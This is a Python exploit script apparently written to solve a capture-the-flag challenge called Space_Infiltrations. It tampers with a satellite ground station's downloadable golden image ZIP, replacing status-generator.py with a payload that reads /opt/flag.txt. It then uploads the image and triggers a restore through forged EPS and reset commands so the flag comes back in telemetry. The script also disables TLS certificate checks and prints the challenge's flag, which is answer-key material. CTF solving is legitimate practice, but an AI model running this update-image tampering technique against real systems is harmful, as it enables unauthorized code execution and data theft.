#!/usr/bin/env python3
"""Space_Infiltrations (STARPWN 2026) — golden image backdoor -> flag downlink.

The YeetSat ground station lets you upload a new "golden image" (ZIP) that is
staged on the ground station and installed on the satellite on the next
"golden image restore". The satellite's telemetry downlink (/api/status) runs
`status-generator.py` whose stdout becomes the downlinked status message.

Exploit:
1. Download the current golden image (ZIP with cFS tree + status files +
   status-generator.py).
2. Replace status-generator.py with a payload that prints /opt/flag.txt
   (the flag lives on the satellite at /opt/flag.txt; status files install to /opt/).
3. Upload the tampered ZIP to /upload/goldenimage (staged).
4. Trigger golden image restore: EPS Modify Payload Power with voltage > 25
   then CFE ES Reset (Power-On Reset).
5. Poll /api/status until the downlink carries the flag.

Flag: STARPWN{9de48ee5d75bd14b45e48948f5b74914}
"""
import io, json, re, ssl, sys, time, urllib.request, zipfile

base = "https://starpwn-4b0a8c9835a9-a-flag-in-space-0-0.chals.io"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

PAYLOAD = """#!/usr/bin/env python3
try:
    with open("/opt/flag.txt") as f:
        print(f.read().strip())
except Exception as e:
    print("SGEN_ERR:" + repr(e))
"""


def http(url, data=None, files=None):
    if files is not None:
        boundary = "----b" + hex(int(time.time() * 100000))[2:]
        body = b""
        for name, (fname, content) in files.items():
            body += (
                f"--{boundary}\r\nContent-Disposition: form-data; "
                f'name="{name}"; filename="{fname}"\r\n'
                f"Content-Type: application/zip\r\n\r\n"
            ).encode() + content + b"\r\n"
        body += f"--{boundary}--\r\n".encode()
        req = urllib.request.Request(
            url, data=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
    else:
        req = urllib.request.Request(url, data=data)
    try:
        with urllib.request.urlopen(req, timeout=60, context=CTX) as r:
            return r.read()
    except urllib.error.HTTPError as e:
        return e.read()


def get_status():
    return json.loads(http(base + "/api/status"))["messages"]


def main():
    print("[*] Downloading current golden image...")
    blob = http(base + "/download/goldenimage")
    if not blob:
        sys.exit("[!] Could not download golden image")
    print(f"[*] Golden image: {len(blob)} bytes")

    zin = zipfile.ZipFile(io.BytesIO(blob))
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zout:
        for info in zin.infolist():
            content = zin.read(info.filename)
            if info.filename == "status-generator.py":
                print("[*] Replacing status-generator.py with payload")
                content = PAYLOAD.encode()
            zout.writestr(info.filename, content)
    evil = out.getvalue()

    print("[*] Uploading tampered golden image...")
    http(base + "/upload/goldenimage", files={"file": ("golden.zip", evil)})

    print("[*] Triggering golden image restore (EPS voltage 26)...")
    http(base + "/api/command",
         data=json.dumps({"command": "EPS Modify Payload Power",
                          "options": {"voltage": 26}}).encode())
    http(base + "/api/command",
         data=json.dumps({"command": "CFE ES Reset",
                          "options": {"reset_type": "Power-On Reset"}}).encode())

    print("[*] Polling /api/status for flag downlink...")
    for i in range(24):
        time.sleep(5)
        msgs = get_status()
        last = msgs[-1]["status"]
        print(f"  t+{(i+1)*5:3d}s  {last}")
        m = re.search(r"STARPWN\{[^}]+\}", last)
        if m:
            print(f"\n[+] FLAG: {m.group(0)}")
            return
    sys.exit("[!] Flag not observed in downlink")


if __name__ == "__main__":
    main()
